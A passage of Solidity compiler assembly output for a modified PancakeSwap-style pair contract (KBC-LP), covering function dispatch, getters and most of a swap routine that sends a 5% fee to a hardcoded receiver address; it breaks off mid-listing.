/* \"src/ERC20.sol\":459:508  mapping(address => uint256) public _frozenBalance */\n    tag_14:\n      tag_63\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_75\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_75:\n      pop\n        /* \"src/ERC20.sol\":459:508  mapping(address => uint256) public _frozenBalance */\n      calldataload\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      tag_76\n      jump\t// in\n        /* \"src/Pair.sol\":934:966  uint public price0CumulativeLast */\n    tag_15:\n      tag_63\n      tag_78\n      jump\t// in\n        /* \"src/Pair.sol\":972:1004  uint public price1CumulativeLast */\n    tag_16:\n      tag_63\n      tag_80\n      jump\t// in\n        /* \"src/Pair.sol\":4905:6170  function mint(address to) external lock returns (uint liquidity) {... */\n    tag_17:\n      tag_63\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_82\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_82:\n      pop\n        /* \"src/Pair.sol\":4905:6170  function mint(address to) external lock returns (uint liquidity) {... */\n      calldataload\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      tag_83\n      jump\t// in\n        /* \"src/ERC20.sol\":339:383  mapping(address => uint256) public balanceOf */\n    tag_18:\n      tag_63\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_85\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_85:\n      pop\n        /* \"src/ERC20.sol\":339:383  mapping(address => uint256) public balanceOf */\n      calldataload\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      tag_86\n      jump\t// in\n        /* \"src/Pair.sol\":1010:1027  uint public kLast */\n    tag_19:\n      tag_63\n      tag_88\n      jump\t// in\n        /* \"src/ERC20.sol\":778:819  mapping(address => uint256) public nonces */\n    tag_20:\n      tag_63\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_90\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_90:\n      pop\n        /* \"src/ERC20.sol\":778:819  mapping(address => uint256) public nonces */\n      calldataload\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      tag_91\n      jump\t// in\n        /* \"src/Pair.sol\":7669:9098  function burn(... */\n    tag_21:\n      tag_92\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_93\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_93:\n      pop\n        /* \"src/Pair.sol\":7669:9098  function burn(... */\n      calldataload\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      tag_94\n      jump\t// in\n    tag_92:\n      0x40\n      dup1\n      mload\n      swap3\n      dup4\n      mstore\n      0x20\n      dup4\n      add\n      swap2\n      swap1\n      swap2\n      mstore\n      dup1\n      mload\n      swap2\n      dup3\n      swap1\n      sub\n      add\n      swap1\n      return\n        /* \"src/Pair.sol\":325:395  address public FeeResiver = 0x9E94Ee69F3CdCd5E74e05563736E4679dA6dB44c */\n    tag_22:\n      tag_58\n      tag_96\n      jump\t// in\n        /* \"src/ERC20.sol\":220:260  string public constant symbol = \"KBC-LP\" */\n    tag_23:\n      tag_47\n      tag_98\n      jump\t// in\n        /* \"src/ERC20.sol\":2963:3102  function transfer(address to, uint256 value) external returns (bool) {... */\n    tag_24:\n      tag_55\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x40\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_104\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_104:\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/ERC20.sol\":2963:3102  function transfer(address to, uint256 value) external returns (bool) {... */\n      dup2\n      calldataload\n      and\n      swap1\n      0x20\n      add\n      calldataload\n      tag_105\n      jump\t// in\n        /* \"src/Pair.sol\":402:450  uint public constant MINIMUM_LIQUIDITY = 10 ** 3 */\n    tag_25:\n      tag_63\n      tag_107\n      jump\t// in\n        /* \"src/Pair.sol\":17701:18122  function skim(address to) external lock {... */\n    tag_26:\n      tag_41\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_109\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_109:\n      pop\n        /* \"src/Pair.sol\":17701:18122  function skim(address to) external lock {... */\n      calldataload\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      tag_110\n      jump\t// in\n        /* \"src/Pair.sol\":559:581  address public factory */\n    tag_27:\n      tag_58\n      tag_112\n      jump\t// in\n        /* \"src/Pair.sol\":614:635  address public token1 */\n    tag_28:\n      tag_58\n      tag_114\n      jump\t// in\n        /* \"src/ERC20.sol\":3475:4439  function permit(... */\n    tag_29:\n      tag_41\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:16   */\n      0xe0\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:17   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_116\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_116:\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/ERC20.sol\":3475:4439  function permit(... */\n      dup2\n      calldataload\n      dup2\n      and\n      swap2\n      0x20\n      dup2\n      add\n      calldataload\n      swap1\n      swap2\n      and\n      swap1\n      0x40\n      dup2\n      add\n      calldataload\n      swap1\n      0x60\n      dup2\n      add\n      calldataload\n      swap1\n      0xff\n      0x80\n      dup3\n      add\n      calldataload\n      and\n      swap1\n      0xa0\n      dup2\n      add\n      calldataload\n      swap1\n      0xc0\n      add\n      calldataload\n      tag_117\n      jump\t// in\n        /* \"src/Pair.sol\":6279:7560  function Lockmint(address to) external lock returns (uint liquidity) {... */\n    tag_30:\n      tag_63\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_119\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_119:\n      pop\n        /* \"src/Pair.sol\":6279:7560  function Lockmint(address to) external lock returns (uint liquidity) {... */\n      calldataload\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      tag_120\n      jump\t// in\n        /* \"src/ERC20.sol\":389:453  mapping(address => mapping(address => uint256)) public allowance */\n    tag_31:\n      tag_63\n      0x04\n      dup1\n      calldatasize\n      sub\n        /* \"--CODEGEN--\":13:15   */\n      0x40\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_122\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_122:\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/ERC20.sol\":389:453  mapping(address => mapping(address => uint256)) public allowance */\n      dup2\n      calldataload\n      dup2\n      and\n      swap2\n      0x20\n      add\n      calldataload\n      and\n      tag_123\n      jump\t// in\n        /* \"src/Pair.sol\":641:659  uint public taxfee */\n    tag_32:\n      tag_63\n      tag_125\n      jump\t// in\n        /* \"src/Pair.sol\":18168:18382  function sync() external lock {... */\n    tag_33:\n      tag_41\n      tag_127\n      jump\t// in\n        /* \"src/Pair.sol\":11600:14446  function swap(... */\n    tag_46:\n        /* \"src/Pair.sol\":1179:1187  unlocked */\n      sload(0x0f)\n        /* \"src/Pair.sol\":1191:1192  1 */\n      0x01\n        /* \"src/Pair.sol\":1179:1192  unlocked == 1 */\n      eq\n        /* \"src/Pair.sol\":1171:1212  require(unlocked == 1, \"Pancake: LOCKED\") */\n      tag_129\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x0f\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x8a, 0x14185b98d85ad94e881313d0d2d151)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_129:\n        /* \"src/Pair.sol\":1233:1234  0 */\n      0x00\n        /* \"src/Pair.sol\":1222:1230  unlocked */\n      0x0f\n        /* \"src/Pair.sol\":1222:1234  unlocked = 0 */\n      sstore\n        /* \"src/Pair.sol\":11764:11778  amount0Out > 0 */\n      dup5\n      iszero\n      iszero\n      dup1\n        /* \"src/Pair.sol\":11764:11796  amount0Out > 0 || amount1Out > 0 */\n      tag_131\n      jumpi\n      pop\n        /* \"src/Pair.sol\":11795:11796  0 */\n      0x00\n        /* \"src/Pair.sol\":11782:11792  amount1Out */\n      dup5\n        /* \"src/Pair.sol\":11782:11796  amount1Out > 0 */\n      gt\n        /* \"src/Pair.sol\":11764:11796  amount0Out > 0 || amount1Out > 0 */\n    tag_131:\n        /* \"src/Pair.sol\":11743:11857  require(... */\n      tag_132\n      jumpi\n      mload(0x40)\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      0x23\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      data_c654718515b5f98052eb92744d97d32cccabf6e8b2bae886738591c9b906cfd8\n      0x23\n      swap2\n      codecopy\n      0x40\n      add\n      swap2\n      pop\n      pop\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      revert\n    tag_132:\n        /* \"src/Pair.sol\":11868:11885  uint112 _reserve0 */\n      0x00\n        /* \"src/Pair.sol\":11887:11904  uint112 _reserve1 */\n      dup1\n        /* \"src/Pair.sol\":11910:11923  getReserves() */\n      tag_133\n        /* \"src/Pair.sol\":11910:11921  getReserves */\n      tag_54\n        /* \"src/Pair.sol\":11910:11923  getReserves() */\n      jump\t// in\n    tag_133:\n        /* \"src/Pair.sol\":11867:11923  (uint112 _reserve0, uint112 _reserve1, ) = getReserves() */\n      pop\n      swap2\n      pop\n      swap2\n      pop\n        /* \"src/Pair.sol\":11982:11991  _reserve0 */\n      dup2\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/Pair.sol\":11969:11991  amount0Out < _reserve0 */\n      and\n        /* \"src/Pair.sol\":11969:11979  amount0Out */\n      dup8\n        /* \"src/Pair.sol\":11969:11991  amount0Out < _reserve0 */\n      lt\n        /* \"src/Pair.sol\":11969:12017  amount0Out < _reserve0 && amount1Out < _reserve1 */\n      dup1\n      iszero\n      tag_134\n      jumpi\n      pop\n        /* \"src/Pair.sol\":12008:12017  _reserve1 */\n      dup1\n      sub(shl(0x70, 0x01), 0x01)\n        /* \"src/Pair.sol\":11995:12017  amount1Out < _reserve1 */\n      and\n        /* \"src/Pair.sol\":11995:12005  amount1Out */\n      dup7\n        /* \"src/Pair.sol\":11995:12017  amount1Out < _reserve1 */\n      lt\n        /* \"src/Pair.sol\":11969:12017  amount0Out < _reserve0 && amount1Out < _reserve1 */\n    tag_134:\n        /* \"src/Pair.sol\":11948:12074  require(... */\n      tag_135\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x1f\n      0x24\n      dup3\n      add\n      mstore\n      0x50616e63616b653a20494e53554646494349454e545f4c495155494449545900\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_135:\n        /* \"src/Pair.sol\":12085:12098  uint balance0 */\n      0x00\n      dup1\n      dup1\n        /* \"src/Pair.sol\":12198:12201  100 */\n      0x64\n        /* \"src/Pair.sol\":12193:12194  5 */\n      0x05\n        /* \"src/Pair.sol\":12180:12194  amount0Out * 5 */\n      dup12\n      mul\n        /* \"src/Pair.sol\":12179:12201  (amount0Out * 5) / 100 */\n      div\n        /* \"src/Pair.sol\":12166:12201  amount0Out - (amount0Out * 5) / 100 */\n      dup11\n      sub\n      swap1\n      pop\n        /* \"src/Pair.sol\":12215:12233  uint taxamount1Out */\n      0x00\n        /* \"src/Pair.sol\":12268:12271  100 */\n      0x64\n        /* \"src/Pair.sol\":12263:12264  5 */\n      0x05\n        /* \"src/Pair.sol\":12250:12264  amount1Out * 5 */\n      dup12\n      mul\n        /* \"src/Pair.sol\":12371:12377  token0 */\n      sload(0x08)\n        /* \"src/Pair.sol\":12409:12415  token1 */\n      sload(0x09)\n        /* \"src/Pair.sol\":12249:12271  (amount1Out * 5) / 100 */\n      swap3\n      swap1\n      swap2\n      div\n        /* \"src/Pair.sol\":12236:12271  amount1Out - (amount1Out * 5) / 100 */\n      dup13\n      sub\n      swap3\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/Pair.sol\":12371:12377  token0 */\n      swap1\n      dup2\n      and\n      swap2\n        /* \"src/Pair.sol\":12409:12415  token1 */\n      dup2\n      and\n      swap1\n        /* \"src/Pair.sol\":12437:12450  to != _token0 */\n      dup12\n      and\n      dup3\n      eq\n      dup1\n      iszero\n      swap1\n        /* \"src/Pair.sol\":12437:12467  to != _token0 && to != _token1 */\n      tag_138\n      jumpi\n      pop\n        /* \"src/Pair.sol\":12460:12467  _token1 */\n      dup1\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/Pair.sol\":12454:12467  to != _token1 */\n      and\n        /* \"src/Pair.sol\":12454:12456  to */\n      dup12\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/Pair.sol\":12454:12467  to != _token1 */\n      and\n      eq\n      iszero\n        /* \"src/Pair.sol\":12437:12467  to != _token0 && to != _token1 */\n    tag_138:\n        /* \"src/Pair.sol\":12429:12491  require(to != _token0 && to != _token1, \"Pancake: INVALID_TO\") */\n      tag_139\n      jumpi\n      0x40\n      dup1\n      mload\n      shl(0xe5, 0x461bcd)\n      dup2\n      mstore\n      0x20\n      0x04\n      dup3\n      add\n      mstore\n      0x13\n      0x24\n      dup3\n      add\n      mstore\n      shl(0x68, 0x50616e63616b653a20494e56414c49445f544f)\n      0x44\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      swap1\n      dup2\n      swap1\n      sub\n      0x64\n      add\n      swap1\n      revert\n    tag_139:\n        /* \"src/Pair.sol\":12509:12523  amount0Out > 0 */\n      dup13\n      iszero\n        /* \"src/Pair.sol\":12505:12566  if (amount0Out > 0) _safeTransfer(_token0, to, taxamount0Out) */\n      tag_141\n      jumpi\n        /* \"src/Pair.sol\":12525:12566  _safeTransfer(_token0, to, taxamount0Out) */\n      tag_141\n        /* \"src/Pair.sol\":12539:12546  _token0 */\n      dup3\n        /* \"src/Pair.sol\":12548:12550  to */\n      dup13\n        /* \"src/Pair.sol\":12552:12565  taxamount0Out */\n      dup7\n        /* \"src/Pair.sol\":12525:12538  _safeTransfer */\n      tag_142\n        /* \"src/Pair.sol\":12525:12566  _safeTransfer(_token0, to, taxamount0Out) */\n      jump\t// in\n    tag_141:\n        /* \"src/Pair.sol\":12618:12632  amount1Out > 0 */\n      dup12\n      iszero\n        /* \"src/Pair.sol\":12614:12675  if (amount1Out > 0) _safeTransfer(_token1, to, taxamount1Out) */\n      tag_144\n      jumpi\n        /* \"src/Pair.sol\":12634:12675  _safeTransfer(_token1, to, taxamount1Out) */\n      tag_144\n        /* \"src/Pair.sol\":12648:12655  _token1 */\n      dup2\n        /* \"src/Pair.sol\":12657:12659  to */\n      dup13\n        /* \"src/Pair.sol\":12661:12674  taxamount1Out */\n      dup6\n        /* \"src/Pair.sol\":12634:12647  _safeTransfer */\n      tag_142\n        /* \"src/Pair.sol\":12634:12675  _safeTransfer(_token1, to, taxamount1Out) */\n      jump\t// in\n    tag_144:\n        /* \"src/Pair.sol\":12727:12742  data.length > 0 */\n      dup9\n      iszero\n        /* \"src/Pair.sol\":12723:12960  if (data.length > 0)... */\n      tag_145\n      jumpi\n        /* \"src/Pair.sol\":12768:12770  to */\n      dup11\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/Pair.sol\":12760:12783  ICallee(to).pancakeCall */\n      and\n      0x84800812\n        /* \"src/Pair.sol\":12805:12815  msg.sender */\n      caller\n        /* \"src/Pair.sol\":12837:12850  taxamount0Out */\n      dup7\n        /* \"src/Pair.sol\":12887:12900  taxamount1Out */\n      dup7\n        /* \"src/Pair.sol\":12938:12942  data */\n      dup15\n      dup15\n        /* \"src/Pair.sol\":12760:12960  ICallee(to).pancakeCall(... */\n      mload(0x40)\n      dup7\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      dup1\n      dup7\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      sub(shl(0xa0, 0x01), 0x01)\n      and\n      dup2\n      mstore\n      0x20\n      add\n      dup6\n      dup2\n      mstore\n      0x20\n      add\n      dup5\n      dup2\n      mstore\n      0x20\n      add\n      dup1\n      0x20\n      add\n      dup3\n      dup2\n      sub\n      dup3\n      mstore\n      dup5\n      dup5\n      dup3\n      dup2\n      dup2\n      mstore\n      0x20\n      add\n      swap3\n      pop\n        /* \"--CODEGEN--\":30:33   */\n      dup1\n        /* \"--CODEGEN--\":22:28   */\n      dup3\n        /* \"--CODEGEN--\":14:20   */\n      dup5\n        /* \"--CODEGEN--\":1:34   */\n      calldatacopy\n        /* \"--CODEGEN--\":99:100   */\n      0x00\n        /* \"--CODEGEN--\":93:96   */\n      dup2\n        /* \"--CODEGEN--\":85:91   */\n      dup5\n        /* \"--CODEGEN--\":81:97   */\n      add\n        /* \"--CODEGEN--\":74:101   */\n      mstore\n        /* \"--CODEGEN--\":137:141   */\n      0x1f\n        /* \"--CODEGEN--\":133:142   */\n      not\n        /* \"--CODEGEN--\":126:130   */\n      0x1f\n        /* \"--CODEGEN--\":121:124   */\n      dup3\n        /* \"--CODEGEN--\":117:131   */\n      add\n        /* \"--CODEGEN--\":113:143   */\n      and\n        /* \"--CODEGEN--\":106:143   */\n      swap1\n      pop\n        /* \"--CODEGEN--\":169:172   */\n      dup1\n        /* \"--CODEGEN--\":161:167   */\n      dup4\n        /* \"--CODEGEN--\":157:173   */\n      add\n        /* \"--CODEGEN--\":147:173   */\n      swap3\n      pop\n        /* \"src/Pair.sol\":12760:12960  ICallee(to).pancakeCall(... */\n      pop\n      pop\n      swap7\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_146\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_146:\n        /* \"src/Pair.sol\":12760:12960  ICallee(to).pancakeCall(... */\n      pop\n      gas\n      call\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_147\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_147:\n        /* \"src/Pair.sol\":12760:12960  ICallee(to).pancakeCall(... */\n      pop\n      pop\n      pop\n      pop\n        /* \"src/Pair.sol\":12723:12960  if (data.length > 0)... */\n    tag_145:\n        /* \"src/Pair.sol\":13006:13009  100 */\n      0x64\n        /* \"src/Pair.sol\":13001:13002  5 */\n      0x05\n        /* \"src/Pair.sol\":12988:13002  amount0Out * 5 */\n      dup15\n      dup2\n      mul\n        /* \"src/Pair.sol\":12987:13009  (amount0Out * 5) / 100 */\n      dup3\n      swap1\n      div\n      swap2\n        /* \"src/Pair.sol\":13036:13050  amount1Out * 5 */\n      swap1\n      dup15\n      mul\n        /* \"src/Pair.sol\":13035:13057  (amount1Out * 5) / 100 */\n      div\n        /* \"src/Pair.sol\":13076:13090  amount0Out > 0 */\n      dup15\n      iszero\n        /* \"src/Pair.sol\":13072:13132  if (amount0Out > 0) _safeTransfer(_token0, FeeResiver, tax0) */\n      tag_151\n      jumpi\n        /* \"src/Pair.sol\":13115:13125  FeeResiver */\n      sload(0x06)\n        /* \"src/Pair.sol\":13092:13132  _safeTransfer(_token0, FeeResiver, tax0) */\n      tag_151\n      swap1\n        /* \"src/Pair.sol\":13106:13113  _token0 */\n      dup6\n      swap1\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/Pair.sol\":13115:13125  FeeResiver */\n      and\n        /* \"src/Pair.sol\":13127:13131  tax0 */\n      dup5\n        /* \"src/Pair.sol\":13092:13105  _safeTransfer */\n      tag_142\n        /* \"src/Pair.sol\":13092:13132  _safeTransfer(_token0, FeeResiver, tax0) */\n      jump\t// in\n    tag_151:\n        /* \"src/Pair.sol\":13184:13198  amount1Out > 0 */\n      dup14\n      iszero\n        /* \"src/Pair.sol\":13180:13240  if (amount1Out > 0) _safeTransfer(_token1, FeeResiver, tax1) */\n      tag_153\n      jumpi\n        /* \"src/Pair.sol\":13223:13233  FeeResiver */\n      sload(0x06)\n        /* \"src/Pair.sol\":13200:13240  _safeTransfer(_token1, FeeResiver, tax1) */\n      tag_153\n      swap1\n        /* \"src/Pair.sol\":13214:13221  _token1 */\n      dup5\n      swap1\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/Pair.sol\":13223:13233  FeeResiver */\n      and\n        /* \"src/Pair.sol\":13235:13239  tax1 */\n      dup4\n        /* \"src/Pair.sol\":13200:13213  _safeTransfer */\n      tag_142\n        /* \"src/Pair.sol\":13200:13240  _safeTransfer(_token1, FeeResiver, tax1) */\n      jump\t// in\n    tag_153:\n        /* \"src/Pair.sol\":13299:13339  IERC20(_token0).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"src/Pair.sol\":13333:13337  this */\n      address\n        /* \"src/Pair.sol\":13299:13339  IERC20(_token0).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/Pair.sol\":13299:13324  IERC20(_token0).balanceOf */\n      dup7\n      and\n      swap2\n      0x70a08231\n      swap2\n        /* \"src/Pair.sol\":13299:13339  IERC20(_token0).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup4\n      add\n      swap3\n      0x20\n      swap3\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"src/Pair.sol\":13299:13324  IERC20(_token0).balanceOf */\n      dup7\n        /* \"src/Pair.sol\":13299:13339  IERC20(_token0).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_154\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_154:\n        /* \"src/Pair.sol\":13299:13339  IERC20(_token0).balanceOf(address(this)) */\n      pop\n      gas\n      staticcall\n      iszero\n        /* \"--CODEGEN--\":8:17   */\n      dup1\n        /* \"--CODEGEN--\":5:7   */\n      iszero\n      tag_155\n      jumpi\n        /* \"--CODEGEN--\":45:61   */\n      returndatasize\n        /* \"--CODEGEN--\":42:43   */\n      0x00\n        /* \"--CODEGEN--\":39:40   */\n      dup1\n        /* \"--CODEGEN--\":24:62   */\n      returndatacopy\n        /* \"--CODEGEN--\":77:93   */\n      returndatasize\n        /* \"--CODEGEN--\":74:75   */\n      0x00\n        /* \"--CODEGEN--\":67:94   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_155:\n        /* \"src/Pair.sol\":13299:13339  IERC20(_token0).balanceOf(address(this)) */\n      pop\n      pop\n      pop\n      pop\n      mload(0x40)\n      returndatasize\n        /* \"--CODEGEN--\":13:15   */\n      0x20\n        /* \"--CODEGEN--\":8:11   */\n      dup2\n        /* \"--CODEGEN--\":5:16   */\n      lt\n        /* \"--CODEGEN--\":2:4   */\n      iszero\n      tag_156\n      jumpi\n        /* \"--CODEGEN--\":29:30   */\n      0x00\n        /* \"--CODEGEN--\":26:27   */\n      dup1\n        /* \"--CODEGEN--\":19:31   */\n      revert\n        /* \"--CODEGEN--\":2:4   */\n    tag_156:\n      pop\n        /* \"src/Pair.sol\":13299:13339  IERC20(_token0).balanceOf(address(this)) */\n      mload\n        /* \"src/Pair.sol\":13364:13404  IERC20(_token1).balanceOf(address(this)) */\n      0x40\n      dup1\n      mload\n      shl(0xe0, 0x70a08231)\n      dup2\n      mstore\n        /* \"src/Pair.sol\":13398:13402  this */\n      address\n        /* \"src/Pair.sol\":13364:13404  IERC20(_token1).balanceOf(address(this)) */\n      0x04\n      dup3\n      add\n      mstore\n      swap1\n      mload\n        /* \"src/Pair.sol\":13299:13339  IERC20(_token0).balanceOf(address(this)) */\n      swap2\n      swap10\n      pop\n      sub(shl(0xa0, 0x01), 0x01)\n        /* \"src/Pair.sol\":13364:13389  IERC20(_token1).balanceOf */\n      dup6\n      and\n      swap2\n      0x70a08231\n      swap2\n        /* \"src/Pair.sol\":13364:13404  IERC20(_token1).balanceOf(address(this)) */\n      0x24\n      dup1\n      dup3\n      add\n      swap3\n        /* \"src/Pair.sol\":13299:13339  IERC20(_token0).balanceOf(address(this)) */\n      0x20\n      swap3\n        /* \"src/Pair.sol\":13364:13404  IERC20(_token1).balanceOf(address(this)) */\n      swap1\n      swap2\n      swap1\n      dup3\n      swap1\n      sub\n      add\n      dup2\n        /* \"src/Pair.sol\":13364:13389  IERC20(_token1).balanceOf */\n      dup7\n        /* \"src/Pair.sol\":13364:13404  IERC20(_token1).balanceOf(address(this)) */\n      dup1\n      extcodesize\n      iszero\n        /* \"--CODEGEN--\":5:7   */\n      dup1\n      iszero\n      tag_157\n      jumpi\n        /* \"--CODEGEN--\":30:31   */\n      0x00\n        /* \"--CODEGEN--\":27:28   */\n      dup1\n        /* \"--CODEGEN--\":20:32   */\n      revert\n        /* \"--CODEGEN--\":5:7   */\n    tag_157:\n        /* 